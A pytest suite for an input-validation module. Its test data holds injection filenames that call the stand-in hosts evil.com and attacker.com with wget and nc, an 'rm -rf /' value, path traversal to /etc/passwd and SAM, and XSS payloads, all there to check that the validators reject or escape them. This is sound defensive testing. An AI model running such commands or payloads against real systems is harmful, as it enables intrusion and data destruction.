from src.utils.datetime_compat import utc_now


"""Comprehensive test suite for input validation with enhanced coverage.

This module provides enhanced test coverage for src/security/input_validation.py,
focusing on areas identified in the security testing review:
- Expanded SecureFileUpload testing with dangerous file extensions and content types
- Enhanced sanitize_dict_values testing with complex nested structures
- URL-encoded payload testing and edge cases
- More extensive invalid character testing for file uploads
"""

from pydantic import ValidationError
import pytest

from src.security.input_validation import (
    SecureEmailField,
    SecureFileUpload,
    SecurePathField,
    SecureStringField,
    create_input_sanitizer,
    sanitize_dict_values,
)


class TestSecureFileUploadComprehensive:
    """Comprehensive testing of SecureFileUpload with extensive dangerous patterns."""

    def test_secure_file_upload_valid_files(self):
        """Test SecureFileUpload with various valid file types."""
        valid_files = [
            {"filename": "document.pdf", "content_type": "application/pdf"},
            {"filename": "image.jpg", "content_type": "image/jpeg"},
            {"filename": "image.png", "content_type": "image/png"},
            {"filename": "data.csv", "content_type": "text/csv"},
            {
                "filename": "document.docx",
                "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            },
            {
                "filename": "presentation.pptx",
                "content_type": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            },
            {
                "filename": "spreadsheet.xlsx",
                "content_type": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            },
            {"filename": "archive.zip", "content_type": "application/zip"},
            {"filename": "video.mp4", "content_type": "video/mp4"},
            {"filename": "audio.mp3", "content_type": "audio/mpeg"},
        ]

        for file_data in valid_files:
            upload = SecureFileUpload(**file_data)
            assert upload.filename == file_data["filename"]
            assert upload.content_type == file_data["content_type"]

    def test_secure_file_upload_dangerous_extensions(self):
        """Test SecureFileUpload rejection of dangerous executable extensions."""
        dangerous_extensions = [
            # Windows executables
            "malware.exe",
            "trojan.bat",
            "virus.cmd",
            "backdoor.com",
            "exploit.scr",
            "rootkit.pif",
            # Script files
            "malicious.js",
            "exploit.vbs",
            "backdoor.ps1",
            "trojan.wsf",
            "virus.jar",
            # Web shells and server scripts
            "webshell.php",
            "backdoor.asp",
            "exploit.aspx",
            "shell.jsp",
            "trojan.py",
            # System files
            "malware.sys",
            "rootkit.dll",
            "exploit.msi",
            # Archive with executables (some)
            "malware.rar",  # Could contain executables
            # Double extensions (bypass attempts)
            "document.pdf.exe",
            "image.jpg.bat",
            "safe.txt.js",
            # Case variations
            "MALWARE.EXE",
            "Virus.BaT",
            "Exploit.PHP",
        ]

        for dangerous_file in dangerous_extensions:
            with pytest.raises((ValueError, ValidationError)):
                SecureFileUpload(filename=dangerous_file, content_type="application/octet-stream")

    def test_secure_file_upload_dangerous_content_types(self):
        """Test SecureFileUpload rejection of dangerous MIME content types."""
        dangerous_content_types = [
            # Executable content types
            "application/x-executable",
            "application/x-msdownload",
            "application/x-msdos-program",
            "application/x-winexe",
            # Script content types
            "application/javascript",
            "application/ecmascript",
            "text/javascript",
            "text/ecmascript",
            "application/x-javascript",
            # Web application scripts
            "application/x-httpd-php",
            "application/x-php",
            "text/php",
            "application/x-asp",
            "text/asp",
            # HTML that could contain scripts
            "text/html",
            "application/xhtml+xml",
            # System files
            "application/x-sharedlib",
            "application/x-executable-file",
            # Malformed or suspicious types
            "invalid/format",
            "not-a-mime-type",
            "application/",
            "/octet-stream",
            "",  # Empty content type
            # Obfuscated attempts
            "application/x-unknown",
            "text/x-script",
        ]

        for dangerous_type in dangerous_content_types:
            with pytest.raises((ValueError, ValidationError)):
                SecureFileUpload(filename="test.txt", content_type=dangerous_type)

    def test_secure_file_upload_filename_injection_attempts(self):
        """Test SecureFileUpload rejection of filename injection attacks."""
        malicious_filenames = [
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "./../config/database.yml",
            # Null byte injection
            "safe.txt\x00.exe",
            "document.pdf\x00malware.exe",
            # Command injection attempts
            "file; rm -rf /",
            "document.pdf && wget evil.com/shell",
            "file | nc attacker.com 4444",
            "$(whoami).txt",
            "`id`.txt",
            # Special characters that could cause issues
            "file\r\nmalicious.exe",
            "file\n<?php echo 'hacked'; ?>",
            "file\tmalware.exe",
            # Unicode attacks
            "file\u202eTXTmalicious.exe",  # Right-to-left override
            "document\ufeffmalware.exe",  # BOM
            # Long filename (over 255 chars)
            "a" * 256 + ".txt",
            # Reserved Windows names
            "CON.txt",
            "PRN.pdf",
            "AUX.doc",
            "NUL.jpg",
            "COM1.zip",
            "LPT1.exe",
            # Spaces and special formatting
            " file.txt",  # Leading space
            "file.txt ",  # Trailing space
            "file..txt",  # Double dots
            ".hidden.exe",  # Hidden file with executable extension
            # URL encoded attempts
            "..%2F..%2Fetc%2Fpasswd",
            "file%00.exe",
            "file%0A%0Dmalicious.exe",
        ]

        for malicious_filename in malicious_filenames:
            with pytest.raises((ValueError, ValidationError)):
                SecureFileUpload(filename=malicious_filename, content_type="text/plain")

    def test_secure_file_upload_content_type_validation(self):
        """Test SecureFileUpload content type validation edge cases."""
        # Test content type format validation
        invalid_content_types = [
            "invalid",  # No slash
            "text/",  # Missing subtype
            "/plain",  # Missing type
            "text//plain",  # Double slash
            "text / plain",  # Spaces around slash
            "TEXT/PLAIN",  # Should be lowercase
            "text\nplain",  # Newline in content type
            "text\tplain",  # Tab in content type
        ]

        for invalid_type in invalid_content_types:
            with pytest.raises((ValueError, ValidationError)):
                SecureFileUpload(filename="test.txt", content_type=invalid_type)

    def test_secure_file_upload_filename_character_validation(self):
        """Test SecureFileUpload filename character validation comprehensively."""
        # Valid characters should pass
        valid_filenames = [
            "simple.txt",
            "file_with_underscores.pdf",
            "file-with-dashes.jpg",
            "file.with.dots.png",
            "123numbers.csv",
            "MixedCase.ZIP",
        ]

        for valid_filename in valid_filenames:
            upload = SecureFileUpload(filename=valid_filename, content_type="text/plain")
            assert upload.filename == valid_filename

        # Invalid characters should fail
        invalid_characters = [
            "file with spaces.txt",  # Spaces
            "file@email.txt",  # @ symbol
            "file#hash.txt",  # Hash
            "file$money.txt",  # Dollar sign
            "file%percent.txt",  # Percent
            "file^caret.txt",  # Caret
            "file&amp.txt",  # Ampersand
            "file*star.txt",  # Asterisk
            "file(paren.txt",  # Parentheses
            "file)paren.txt",
            "file[bracket.txt",  # Brackets
            "file]bracket.txt",
            "file{brace.txt",  # Braces
            "file}brace.txt",
            "file=equals.txt",  # Equals
            "file+plus.txt",  # Plus
            "file|pipe.txt",  # Pipe
            "file\\backslash.txt",  # Backslash
            "file/slash.txt",  # Forward slash
            "file:colon.txt",  # Colon
            "file;semicolon.txt",  # Semicolon
            'file"quote.txt',  # Double quote
            "file'quote.txt",  # Single quote
            "file<less.txt",  # Less than
            "file>greater.txt",  # Greater than
            "file?question.txt",  # Question mark
            "file,comma.txt",  # Comma
        ]

        for invalid_char_filename in invalid_characters:
            with pytest.raises((ValueError, ValidationError)):
                SecureFileUpload(filename=invalid_char_filename, content_type="text/plain")

    def test_secure_file_upload_extension_content_type_mismatch(self):
        """Test detection of extension/content-type mismatches."""
        # These should be flagged as suspicious (if implemented)
        suspicious_combinations = [
            {"filename": "document.pdf", "content_type": "application/javascript"},
            {"filename": "image.jpg", "content_type": "text/html"},
            {"filename": "data.csv", "content_type": "application/x-executable"},
            {"filename": "safe.txt", "content_type": "application/x-php"},
        ]

        for combo in suspicious_combinations:
            # Currently the validation allows this, but it could be enhanced
            # For now, just test that it doesn't crash
            try:
                upload = SecureFileUpload(**combo)
                # If we get here, the current implementation allows it
                assert upload.filename == combo["filename"]
            except ValueError:
                # If it rejects it, that's also acceptable
                pass


class TestSanitizeDictValuesComprehensive:
    """Comprehensive testing of sanitize_dict_values with complex nested structures."""

    def test_sanitize_dict_simple_nested(self):
        """Test sanitization of simple nested dictionaries."""
        data = {
            "user": {
                "name": "John <script>alert('xss')</script> Doe",
                "email": "john@example.com",
                "bio": "I love <b>bold</b> text & HTML",
            },
            "settings": {
                "theme": "dark",
                "notifications": True,
            },
        }

        result = sanitize_dict_values(data)

        # String values should be escaped
        assert "&lt;script&gt;" in result["user"]["name"]
        assert "&lt;/script&gt;" in result["user"]["name"]
        assert "&lt;b&gt;" in result["user"]["bio"]
        assert "&amp;" in result["user"]["bio"]

        # Email should remain unchanged (safe)
        assert result["user"]["email"] == "john@example.com"

        # Non-string values should remain unchanged
        assert result["settings"]["theme"] == "dark"
        assert result["settings"]["notifications"] is True

    def test_sanitize_dict_deeply_nested(self):
        """Test sanitization of deeply nested data structures."""
        data = {
            "level1": {
                "level2": {
                    "level3": {
                        "level4": {
                            "level5": {
                                "dangerous": "<script>deep.nested.attack()</script>",
                                "safe": "normal text",
                                "mixed": "Safe & <em>dangerous</em> content",
                            },
                        },
                    },
                },
            },
        }

        result = sanitize_dict_values(data)

        deep_value = result["level1"]["level2"]["level3"]["level4"]["level5"]["dangerous"]
        assert "&lt;script&gt;" in deep_value
        assert "deep.nested.attack()" in deep_value

        mixed_value = result["level1"]["level2"]["level3"]["level4"]["level5"]["mixed"]
        assert "&amp;" in mixed_value
        assert "&lt;em&gt;" in mixed_value

    def test_sanitize_dict_with_complex_lists(self):
        """Test sanitization of dictionaries containing complex list structures."""
        data = {
            "comments": [
                {
                    "text": "This is <script>evil</script> comment",
                    "author": "user1",
                    "replies": [
                        {
                            "text": "Reply with <img src=x onerror=alert(1)>",
                            "author": "user2",
                        },
                    ],
                },
                {
                    "text": "Another comment with & symbols",
                    "tags": ["<b>bold</b>", "normal", "<i>italic</i>"],
                },
            ],
            "metadata": {
                "total": 2,
                "filtered_content": ["<div>html</div>", "safe content", 123],
            },
        }

        result = sanitize_dict_values(data)

        # Check nested list sanitization
        assert "&lt;script&gt;" in result["comments"][0]["text"]
        assert "&lt;img" in result["comments"][0]["replies"][0]["text"]
        assert "onerror=" in result["comments"][0]["replies"][0]["text"]

        # Check list of mixed content
        assert "&lt;b&gt;" in result["comments"][1]["tags"][0]
        assert result["comments"][1]["tags"][1] == "normal"  # Unchanged
        assert "&lt;i&gt;" in result["comments"][1]["tags"][2]

        # Check mixed type list
        assert "&lt;div&gt;" in result["metadata"]["filtered_content"][0]
        assert result["metadata"]["filtered_content"][1] == "safe content"
        assert result["metadata"]["filtered_content"][2] == 123  # Number unchanged

    def test_sanitize_dict_different_sanitizer_types(self):
        """Test sanitize_dict_values with different sanitizer types."""
        data = {
            "email_field": "user@domain.com",
            "path_field": "documents/file.txt",
            "string_field": "<script>alert('test')</script>",
            "nested": {
                "email": "test@example.com",
                "content": "HTML <b>content</b>",
            },
        }

        # Test with email sanitizer
        email_result = sanitize_dict_values(data, "email")
        assert email_result["email_field"] == "user@domain.com"  # Should be lowercase
        assert email_result["nested"]["email"] == "test@example.com"

        # Test with path sanitizer
        path_result = sanitize_dict_values(data, "path")
        assert path_result["path_field"] == "documents/file.txt"

        # Test with string sanitizer (default)
        string_result = sanitize_dict_values(data, "string")
        assert "&lt;script&gt;" in string_result["string_field"]
        assert "&lt;b&gt;" in string_result["nested"]["content"]

    def test_sanitize_dict_with_none_and_empty_values(self):
        """Test sanitization with None values and empty structures."""
        data = {
            "none_value": None,
            "empty_string": "",
            "empty_dict": {},
            "empty_list": [],
            "mixed": {
                "some_none": None,
                "some_data": "<script>test</script>",
                "nested_empty": {
                    "empty_nested": {},
                },
            },
        }

        result = sanitize_dict_values(data)

        # None values should remain None
        assert result["none_value"] is None
        assert result["mixed"]["some_none"] is None

        # Empty structures should remain
        assert result["empty_string"] == ""
        assert result["empty_dict"] == {}
        assert result["empty_list"] == []
        assert result["mixed"]["nested_empty"]["empty_nested"] == {}

        # Other data should be sanitized
        assert "&lt;script&gt;" in result["mixed"]["some_data"]

    def test_sanitize_dict_with_special_data_types(self):
        """Test sanitization with various Python data types."""
        from datetime import date
        from decimal import Decimal

        data = {
            "string": "<script>alert('xss')</script>",
            "integer": 42,
            "float": 3.14159,
            "boolean_true": True,
            "boolean_false": False,
            "datetime": utc_now(),
            "date": date.today(),
            "decimal": Decimal("123.45"),
            "bytes": b"binary data",
            "set_data": {1, 2, 3},  # Sets are not dict/list/str
            "complex_data": {
                "mixed_list": [
                    "string with <em>html</em>",
                    42,
                    True,
                    ["nested", "list", "<b>bold</b>"],
                ],
            },
        }

        result = sanitize_dict_values(data)

        # Only strings should be sanitized
        assert "&lt;script&gt;" in result["string"]
        assert result["integer"] == 42
        assert result["float"] == 3.14159
        assert result["boolean_true"] is True
        assert result["boolean_false"] is False
        assert result["datetime"] == data["datetime"]  # Unchanged
        assert result["date"] == data["date"]  # Unchanged
        assert result["decimal"] == data["decimal"]  # Unchanged
        assert result["bytes"] == data["bytes"]  # Unchanged
        assert result["set_data"] == data["set_data"]  # Unchanged

        # Nested mixed types
        assert "&lt;em&gt;" in result["complex_data"]["mixed_list"][0]
        assert result["complex_data"]["mixed_list"][1] == 42
        assert result["complex_data"]["mixed_list"][2] is True
        assert "&lt;b&gt;" in result["complex_data"]["mixed_list"][3][2]

    def test_sanitize_dict_circular_reference_protection(self):
        """Test that sanitization handles circular references gracefully."""
        # Create a circular reference
        data = {"level1": {"level2": {}}}
        data["level1"]["level2"]["back_to_root"] = data  # Circular reference

        # This should not cause infinite recursion
        # Note: The current implementation may not handle this well,
        # but we should test it doesn't crash completely
        try:
            result = sanitize_dict_values(data)
            # If it succeeds, verify basic structure
            assert "level1" in result
        except RecursionError:
            # This is acceptable for now - circular references are edge cases
            pass

    def test_sanitize_dict_performance_large_structure(self):
        """Test sanitization performance with large nested structures."""
        # Create a large nested structure
        large_data = {}

        for i in range(100):  # 100 top-level items
            large_data[f"section_{i}"] = {
                "items": [
                    {
                        "content": f"Item {j} with <script>alert({i}_{j})</script>",
                        "metadata": {"safe": f"meta_{j}", "count": j},
                    }
                    for j in range(10)  # 10 items each
                ],
            }

        # Should complete without timing out
        result = sanitize_dict_values(large_data)

        # Verify a sample of the results
        assert "&lt;script&gt;" in result["section_0"]["items"][0]["content"]
        assert result["section_0"]["items"][0]["metadata"]["count"] == 0
        assert len(result) == 100

    def test_sanitize_dict_url_encoded_payloads(self):
        """Test sanitization of URL-encoded malicious payloads."""
        url_encoded_data = {
            "encoded_script": "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
            "encoded_img": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
            "double_encoded": "%253Cscript%253E",  # Double encoded
            "mixed_encoding": "normal text with %3Cscript%3E in middle",
            "nested_encoded": {
                "payload": "%3Ciframe%20src%3D%22javascript:alert%281%29%22%3E",
            },
        }

        result = sanitize_dict_values(url_encoded_data)

        # URL-encoded content should be preserved and then HTML-escaped
        # The current implementation may not decode URLs, which is actually safer
        for _key, value in result.items():
            if isinstance(value, str):
                # Should contain escaped characters or preserved encoding
                assert "%" in value or "&lt;" in value or "&gt;" in value
            elif isinstance(value, dict):
                # Check nested
                for _nested_key, nested_value in value.items():
                    if isinstance(nested_value, str):
                        assert "%" in nested_value or "&lt;" in nested_value or "&gt;" in nested_value


class TestInputSanitizerFactory:
    """Test the create_input_sanitizer factory function."""

    def test_create_input_sanitizer_returns_all_types(self):
        """Test that create_input_sanitizer returns sanitizers for all expected types."""
        sanitizers = create_input_sanitizer()

        expected_types = ["string", "path", "email"]
        for sanitizer_type in expected_types:
            assert sanitizer_type in sanitizers
            assert callable(sanitizers[sanitizer_type])

    def test_sanitizer_factory_functions_work(self):
        """Test that the sanitizer functions from factory actually work."""
        sanitizers = create_input_sanitizer()

        # Test string sanitizer
        string_result = sanitizers["string"]("<script>alert('test')</script>")
        assert "&lt;script&gt;" in string_result

        # Test email sanitizer
        email_result = sanitizers["email"]("TEST@EXAMPLE.COM")
        assert email_result == "test@example.com"

        # Test path sanitizer
        try:
            path_result = sanitizers["path"]("valid/path.txt")
            assert path_result == "valid/path.txt"
        except ValueError:
            # Some path sanitizers might be more restrictive
            pass

    def test_sanitizer_factory_edge_cases(self):
        """Test sanitizer factory with edge cases."""
        sanitizers = create_input_sanitizer()

        # Test with empty strings
        for sanitizer in sanitizers.values():
            try:
                result = sanitizer("")
                assert result == "" or isinstance(result, str)
            except ValueError:
                # Some sanitizers may reject empty strings
                pass

        # Test with None (should handle gracefully or raise appropriate error)
        for _sanitizer_name, sanitizer in sanitizers.items():
            try:
                result = sanitizer(None)
                # If it succeeds, should return string
                assert isinstance(result, str)
            except (ValueError, TypeError, AttributeError):
                # This is acceptable - sanitizers may not handle None
                pass


class TestSecureValidationEdgeCases:
    """Test edge cases across all secure validation classes."""

    def test_all_secure_fields_with_extreme_lengths(self):
        """Test all secure field types with extremely long inputs."""
        # Test at the boundary (exactly at limit)
        boundary_string = "a" * 10000  # 10KB limit

        try:
            result = SecureStringField.validate(boundary_string)
            assert len(result) == 10000
        except ValueError:
            # May be rejected for other reasons (pattern matching, etc.)
            pass

        # Test over the boundary
        over_limit_string = "a" * 10001
        with pytest.raises(ValueError, match="too long|Input too long"):
            SecureStringField.validate(over_limit_string)

    def test_unicode_and_international_content(self):
        """Test secure fields with international and Unicode content."""
        international_content = [
            "José María García",  # Spanish characters
            "北京市",  # Chinese characters
            "Москва",  # Russian characters
            "العربية",  # Arabic
            "🎉 Party time! 🎊",  # Emojis
            "Test\u202E\u202Dreverse",  # Right-to-left override attack
        ]

        for content in international_content:
            try:
                result = SecureStringField.validate(content)
                # Should preserve international characters (after HTML escaping)
                assert isinstance(result, str)
            except ValueError:
                # May be rejected for security reasons (like RLO attacks)
                pass

    def test_all_validation_with_mixed_content(self):
        """Test all validation types with content that mixes valid and invalid patterns."""
        mixed_contents = [
            "Valid content with <script>bad part</script>",
            "email@domain.com<script>alert(1)</script>",
            "valid/path/../../../etc/passwd",
            "Normal text\x00\x0A\x0D with nulls and newlines",
        ]

        validators = [
            ("string", SecureStringField.validate),
            ("path", SecurePathField.validate),
            ("email", SecureEmailField.validate),
        ]

        for _validator_name, validator in validators:
            for content in mixed_contents:
                try:
                    result = validator(content)
                    # If validation succeeds, should be cleaned/escaped
                    if "script" in content.lower():
                        assert "&lt;" in result or "script" not in result.lower()
                except ValueError:
                    # Expected for most mixed content
                    pass
